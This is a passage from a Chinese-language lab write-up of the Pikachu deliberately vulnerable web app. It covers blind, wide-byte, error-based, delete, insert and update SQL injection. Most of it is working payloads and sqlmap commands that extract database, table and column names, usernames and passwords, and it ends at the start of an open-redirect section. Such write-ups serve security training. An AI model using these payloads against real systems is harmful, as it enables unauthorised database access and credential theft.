<h3 id="猜字段个数"><a href="#猜字段个数" class="headerlink" title="猜字段个数"></a>猜字段个数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)&gt;=5%23</span><br><span class="line">?name=lili&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)&gt;=4%23</span><br></pre></td></tr></table></figure>

<h3 id="猜字段名长度"><a href="#猜字段名长度" class="headerlink" title="猜字段名长度"></a>猜字段名长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&gt;=2%23</span><br><span class="line">?name=lili&#x27; and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&gt;=2%23</span><br></pre></td></tr></table></figure>

<h3 id="猜字段名"><a href="#猜字段名" class="headerlink" title="猜字段名"></a>猜字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;=106%23</span><br><span class="line">?name=lili&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;=105%23</span><br></pre></td></tr></table></figure>

<h3 id="猜字段内容个数"><a href="#猜字段内容个数" class="headerlink" title="猜字段内容个数"></a>猜字段内容个数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and (select count(id) from users)&gt;=3	# 正常</span><br><span class="line">?name=lili&#x27; and (select count(id) from users)&gt;=4	# 异常</span><br></pre></td></tr></table></figure>

<h3 id="猜字段内容长度"><a href="#猜字段内容长度" class="headerlink" title="猜字段内容长度"></a>猜字段内容长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据表users下的username字段的第一、二行数据内容长度</span><br><span class="line">?name=lili&#x27; and length((select username from users limit 0,1))&gt;=5%23	# 第一行</span><br><span class="line">?name=lili&#x27; and length((select username from users limit 0,1))&gt;=7%23	# 第二行</span><br></pre></td></tr></table></figure>

<h3 id="猜字段内容"><a href="#猜字段内容" class="headerlink" title="猜字段内容"></a>猜字段内容</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">猜username字段的第一行内容的第一、二个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select username from users limit 0,1),1,1))&gt;=97%23	# 正常</span><br><span class="line">?name=lili&#x27; and ascii(substr((select username from users limit 0,1),2,1))&gt;=100%23	# 正常</span><br><span class="line"></span><br><span class="line">猜username字段的第二行内容的第一、二个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select username from users limit 0,1),1,1))&gt;=97%23	# 正常</span><br><span class="line">?name=lili&#x27; and ascii(substr((select username from users limit 0,1),2,1))&gt;=100%23	# 正常</span><br></pre></td></tr></table></figure>

<h2 id="sqlmap-6"><a href="#sqlmap-6" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>遇到盲注就别手注了，直接sqlmap或写脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_blind_b.php?name=lili&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -p name --batch</span><br></pre></td></tr></table></figure>

<p>sqlmap都得跑一阵子</p>
<p><img src="/images/image-20230110001714570.png" alt="image-20230110001714570"></p>
<p>但这题sqlmap使用的是时间盲注</p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.freebuf.com/articles/network/282252.html">https://www.freebuf.com/articles/network/282252.html</a></p>
<h4 id="魔术引号"><a href="#魔术引号" class="headerlink" title="魔术引号"></a>魔术引号</h4><p>magic_quotes_gpc（魔术引号开关）</p>
<p>magic_quotes_gpc函数在php中的作用是判断解析用户提交的数据</p>
<p>如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p>
<p>单引号（’）、双引号（”）、反斜线（\）等字符都会被加上反斜线</p>
<p>可以看出这个在一定程度上就能对sql注入进行防护，因为我们没法通过引号或双引号制造闭合，我们输入的内容就不会被当作sql语句执行</p>
<h4 id="GBK编码"><a href="#GBK编码" class="headerlink" title="GBK编码"></a>GBK编码</h4><p>GBK编码是我国自己的一套编码，许多系统仍在沿用，</p>
<p>gbk是一种多字符编码。他使用了双字节编码方案，因为双字节编码所以gbk编码汉字，占用2个字节。</p>
<p>而一个utf-8编码的汉字，占用3个字节。</p>
<p>例如：</p>
<p>0xD50×5C 对应了汉字“誠 ”，URL编码用百分号加字符的16进制编码表示字符，于是 %d5%5c 经URL解码后为“誠”。</p>
<h4 id="宽字节SQL注入的原理"><a href="#宽字节SQL注入的原理" class="headerlink" title="宽字节SQL注入的原理"></a>宽字节SQL注入的原理</h4><p>数据库编码为非英文编码就有可能产生宽字节注入(比如GBK编码)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET NAMES &#x27;gbk&#x27;</span><br><span class="line">或</span><br><span class="line">SET character_set_client =gbk</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110091916345.png" alt="image-20230110091916345"></p>
<p>由于有magic_quotes_gpc的存在，传入的特殊字符会被添加一个转义字符”\“</p>
<p>“\“的url编码为%5c</p>
<p>于是我们可以再添加一个字符凑成一个gbk汉字，这样就会将”\“过滤</p>
<p>例如，運’字的GBK编码是%df%5c</p>
<p>当传入的sql语句为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1\&#x27;#&#x27;</span><br></pre></td></tr></table></figure>

<p>添加%df后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1運&#x27;#&#x27;</span><br></pre></td></tr></table></figure>

<p>注意：具体显示可能不会显示汉字，而是一个乱码，这里仅作了解原理</p>
<h2 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h2><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1%df&#x27; or 1=1#</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110092955693.png" alt="image-20230110092955693"></p>
<p>可以判断为宽字节注入</p>
<h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1%df&#x27; order by 2#		# 正常</span><br><span class="line">name=1%df&#x27; order by 3#		# 异常</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110093225671.png" alt="image-20230110093225671"></p>
<p>字段数为2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1%df&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110093329224.png" alt="image-20230110093329224"></p>
<h4 id="获取数据库-1"><a href="#获取数据库-1" class="headerlink" title="获取数据库"></a>获取数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1%df&#x27; union select database(),2#</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110093413618.png" alt="image-20230110093413618"></p>
<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1%df&#x27; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2#</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110093512717.png" alt="image-20230110093512717"></p>
<h4 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1%df&#x27; union select (select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 3,1)),2#</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110093825765.png" alt="image-20230110093825765"></p>
<p>limit 3,1是用来选择数据库用的</p>
<p>select database()可能会有多行数据库，通过limit选择到想要的数据库</p>
<h4 id="获取字段值-1"><a href="#获取字段值-1" class="headerlink" title="获取字段值"></a>获取字段值</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1%df&#x27; union select (select group_concat(username) from users),(select group_concat(password) from users)#</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110094054457.png" alt="image-20230110094054457"></p>
<h2 id="sqlmap-7"><a href="#sqlmap-7" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlmap跑宽字节注入需要用到tamper</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--tamper unmagicquotes</span><br></pre></td></tr></table></figure>

<p>tamper是sqlmap的脚本，这里可以理解为sqlmap发送payload是将单引号前加一个%df</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_widebyte.php&quot; --data=&quot;name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -p name --batch --tamper unmagicquotes</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110095012638.png" alt="image-20230110095012638"></p>
<h1 id="报错注入前置知识"><a href="#报错注入前置知识" class="headerlink" title="报错注入前置知识"></a>报错注入前置知识</h1><h3 id="xpath报错注入"><a href="#xpath报错注入" class="headerlink" title="xpath报错注入"></a>xpath报错注入</h3><p>在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml()</span><br><span class="line">extractvalue()</span><br></pre></td></tr></table></figure>

<p>当这两个函数在执行时，如果出现xml文档路径错误就会产生报错</p>
<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p>用于改变文档中符合条件的节点的值</p>
<p>语法： </p>
<p>updatexml（XML_document，XPath_string，new_value）</p>
<p>第一个参数：是string格式，为XML文档对象的名称</p>
<p>第二个参数：代表路径，Xpath格式的字符串</p>
<p>第三个参数：string格式，替换查找到的符合条件的数据</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1 from information_schema.tables where (updatexml(1,0x7e,3));</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109155137082.png" alt="image-20230109155137082"></p>
<p>由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select 666),0x7e),1);</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109155523640.png" alt="image-20230109155523640"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109160329164.png" alt="image-20230109160329164"></p>
<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>此函数从目标XML中返回包含所查询值的字符串 </p>
<p>语法：</p>
<p>extractvalue（XML_document，xpath_string） </p>
<p>第一个参数：string格式，为XML文档对象的名称</p>
<p>第二个参数：xpath_string（xpath格式的字符串） </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select 111),0x7e));</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109155950514.png" alt="image-20230109155950514"></p>
<p>concat用于连接两个字符串</p>
<p><img src="/images/image-20230109160149638.png" alt="image-20230109160149638"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109160306652.png" alt="image-20230109160306652"></p>
<h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>原理可以参考</p>
<p><a href="https://www.freebuf.com/articles/web/242986.html">https://www.freebuf.com/articles/web/242986.html</a></p>
<p><a href="https://www.cnblogs.com/richardlee97/p/10617115.html">https://www.cnblogs.com/richardlee97/p/10617115.html</a></p>
<p>可以先看一个payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109161907927.png" alt="image-20230109161907927"></p>
<p>floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分</p>
<h5 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h5><p>rand()函数可以用来生成0和1之间的随机数，但是rand(0)和rand()有本质区别</p>
<p>rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数生成</p>
<p>rand()生成的数字是完全随机的，而rand(0)是有规律的生成，我们可以在数据库中尝试一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select rand();</span><br></pre></td></tr></table></figure>

<p>结果每次都不一样</p>
<p><img src="/images/image-20230109162133611.png" alt=" "></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select rand(0);</span><br></pre></td></tr></table></figure>

<p>结果不会有变化</p>
<p><img src="/images/image-20230109162031881.png" alt="image-20230109162031881"></p>
<p>配合floor()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select floor(rand(0)) from user;</span><br><span class="line"></span><br><span class="line">select floor(rand(0)*2) from user;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109162542325.png" alt="image-20230109162542325"></p>
<p>很显然rand(0)是伪随机的，有规律可循，这也是我们采用rand(0)进行报错注入的原因，rand(0)是稳定的，同样rand(n)都一样，这样每次注入都会报错，而rand()则需要碰运气了</p>
<p>输出多少看from的表有几列，每一列都会输出一个floor(rand(0))</p>
<h5 id="count"><a href="#count" class="headerlink" title="count(*)"></a>count(*)</h5><p>count(*)，这是一个聚合函数，返回值的数目，它与count()的区别是它不排除NULL</p>
<h5 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h5><p>floor()报错注入需要配合group by</p>
<p>GROUP BY 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sex,count(*) from member group by sex;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109164120043.png" alt="image-20230109164120043"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*),concat(floor(rand(0)*2),(select user()))x from member group by x;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109165251841.png" alt="image-20230109165251841"></p>
<p>group by在执行时，会依次取出查询表中的记录并创建一个临时表，group by的对象便是该临时表的主键。如果临时表中已经存在该主键，则将count(*)值加1，如果不存在，则将该主键插入到临时表中，注意是插入！查询前创建的空临时表。 </p>
<p>那就产生了一个问题</p>
<p>floor(rand(0)*2不是0就是1，当插入了临时表后，为什么不是count(*)加1，而是报错</p>
<p>因为还有一个最重要的特性，就是group by与rand()使用时，如果临时表中没有该主键，则在插入前rand()会再计算一次(已经是决定插入，但再计算一遍值)，就是这个特性导致了主键重复并报错。</p>
<p>我们使用group by进行分组查询的时候，数据库会生成一张虚拟表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*),username from users group by username;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230224093155425.png" alt="image-20230224093155425"></p>
<p>上述命令会以username作为主键</p>
<p>按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*),concat(user(),floor(rand(0)*2))x from users group by x;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230224094415861.png" alt="image-20230224094415861"></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>上述是比较常见的几种报错注入</p>
<p>其余的报错注入利用可参考</p>
<p><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a></p>
<h1 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h1><p>由于是delete注入，抓取删除的数据包</p>
<p><img src="/images/image-20230109224454398.png" alt="image-20230109224454398"></p>
<p>delete语法</p>
<p><img src="/images/image-20230109224541248.png" alt="image-20230109224541248"></p>
<p>源码大概类似为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from 表名 where id=57</span><br></pre></td></tr></table></figure>

<h2 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h2><p>由于可控的位置在where后面，无法直接通过union select输出内容</p>
<p>利用报错注入</p>
<h5 id="获取数据库-2"><a href="#获取数据库-2" class="headerlink" title="获取数据库"></a>获取数据库</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(&#x27;.&#x27;,(select database()),&#x27;.&#x27;),1)</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109224846408.png" alt="image-20230109224846408"></p>
<h5 id="获取字段值-2"><a href="#获取字段值-2" class="headerlink" title="获取字段值"></a>获取字段值</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(&#x27;.&#x27;,(select username from users limit 0,1),&#x27;.&#x27;),1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(&#x27;.&#x27;,(select password from users limit 0,1),&#x27;.&#x27;),1)</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109225205208.png" alt="image-20230109225205208"></p>
<h1 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h1><p>先自己注册一个账号</p>
<p><img src="/images/image-20230109151523594.png" alt="image-20230109151523594"></p>
<p>insert和update都是更新数据库的关键词，由此可以判断注入应该存在于注册阶段</p>
<p><img src="/images/image-20230109151801590.png" alt="image-20230109151801590"></p>
<p>抓取数据包</p>
<p><img src="/images/image-20230109151855923.png" alt="image-20230109151855923"></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=test&#x27;,&#x27;123&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)%23&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109153408606.png" alt="image-20230109153408606"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=test&#x27;,&#x27;123&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;)%23&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109153447170.png" alt="image-20230109153447170"></p>
<p>可以判断大致源码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into 表名(用户名,密码,性别,电话,地址,住址) values(数据1,数据2,数据3,数据4,数据5,数据6);</span><br></pre></td></tr></table></figure>

<p>因为这里没有回显，需要用到报错注入</p>
<p>insert into 表名(‘a’ and updatexml(1,concat(‘.’,(select database()),’~’),1) ,’密码,性别,电话,地址,住址) values(数据1,数据2,数据3,数据4,数据5,数据6);</p>
<h2 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h2><p>相关报错注入的前置知识在《报错注入前置知识》中</p>
<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109171528855.png" alt="image-20230109171528855"></p>
<p>这里不用0x7e(~)也行，可以用’.’替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=username=a&#x27; and updatexml(1,concat(&#x27;.&#x27;,(select database()),&#x27;~&#x27;),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109220259851.png" alt="image-20230109220259851"></p>
<p>构造后的sql语句为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into member(username,pw,sex,phonenum,email,address) values(&#x27;a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br></pre></td></tr></table></figure>

<p>把主要部分提出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">values(&#x27;a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br></pre></td></tr></table></figure>

<p>可以看出来username其实为一个or语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>可以做一个测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into test(id,name) values(1 or 2,&quot;root&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109201349029.png" alt="image-20230109201349029"></p>
<p>or(或)，当前面为真时则只执行前面的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into test(id,name) values(0 and 1,&quot;root&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109201644077.png" alt="image-20230109201644077"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into test(id,name) values(0 or 1,&quot;root&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109201838975.png" alt="image-20230109201838975"></p>
<p>可以看到这里是一个类似bool的判断，为真则为1，为假(0)则为0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into test(id,name) values(1 or &quot;haha&quot;,&#x27;root&#x27; );</span><br></pre></td></tr></table></figure>

<p>如果是字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into test(id,name) values(1,&#x27;&#x27; or &#x27;&#x27;  );</span><br><span class="line">insert into test(id,name) values(1,&#x27;&#x27; or null  );</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109210800957.png" alt="image-20230109210800957"></p>
<p>后续可以自己尝试</p>
<p>放入payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into test(id,name) values(1,updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;admin&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109210927245.png" alt="image-20230109210927245"></p>
<h3 id="获取数据表名"><a href="#获取数据表名" class="headerlink" title="获取数据表名"></a>获取数据表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="group-concat-1"><a href="#group-concat-1" class="headerlink" title="group_concat()"></a>group_concat()</h5><p>group_concat看起来和concat很像，其实差蛮多</p>
<p>group_concat可以将某一列所有的值，拼接成一个字符串</p>
<p>而concat如果参数是某一列字符串，输出的还是某一列</p>
<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(id,&quot;test&quot;) from test; </span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109213909438.png" alt="image-20230109213909438"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select concat(id,&quot;test&quot;) from test; </span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109213937383.png" alt="image-20230109213937383"></p>
<p>这两函数用哪一个，完全看场景(正常注入group_concat较多，盲注中会存在cancat)</p>
<p>当只需要一个字符串时，用group_concat</p>
<h5 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h5><p>可能会遇到数据过长而显示不完全的情况</p>
<p>使用limit限制查询数量，每次查询一条结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p>limit和substr的语法类似</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit m,n</span><br></pre></td></tr></table></figure>

<p>m表示起始位置，n表示读取几行，从第m条记录开始, 返回n条记录 </p>
<h3 id="获取字段名-1"><a href="#获取字段名-1" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="获取字段值-3"><a href="#获取字段值-3" class="headerlink" title="获取字段值"></a>获取字段值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询用户名</span><br><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) or&#x27;</span><br><span class="line"></span><br><span class="line">查询密码</span><br><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p>查询密码时最后一位显示不完全，可能是因为长度太长,将~替换为.就可以显示出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(&#x27;.&#x27;,(select password from users limit 0,1)),1) or&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="sqlmap-8"><a href="#sqlmap-8" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_iu/sqli_reg.php&quot; --data=&quot;username=admin&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit&quot; -p username --batch</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109222211826.png" alt="image-20230109222211826"></p>
<h1 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h1><p>登录后修改个人信息</p>
<p><img src="/images/image-20230109222929316.png" alt="image-20230109222929316"></p>
<p>抓取数据包</p>
<p><img src="/images/image-20230109223022020.png" alt="image-20230109223022020"></p>
<p>和insert注入的逻辑差不多，无非就是源码上的区别，造闭合，报错注入一把梭就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition;</span><br></pre></td></tr></table></figure>

<h2 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h2><h5 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sex=nan&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p>拼接和insert注入相同，这里就不分析了</p>
<p><img src="/images/image-20230109224038685.png" alt="image-20230109224038685"></p>
<h5 id="猜字段信息-1"><a href="#猜字段信息-1" class="headerlink" title="猜字段信息"></a>猜字段信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sex=&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select username from users limit 0,1),&#x27;~&#x27;),1) or &#x27;</span><br><span class="line"></span><br><span class="line">sex=&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select password from users limit 1,1),&#x27;~&#x27;),1) or &#x27;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-不安全的URL跳转</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
    <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20230110155041071.png" alt="image-20230110155041071"></p>
<p>点击最后一个参数</p>
<p>获取url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=i</span><br></pre></td></tr></table></figure>

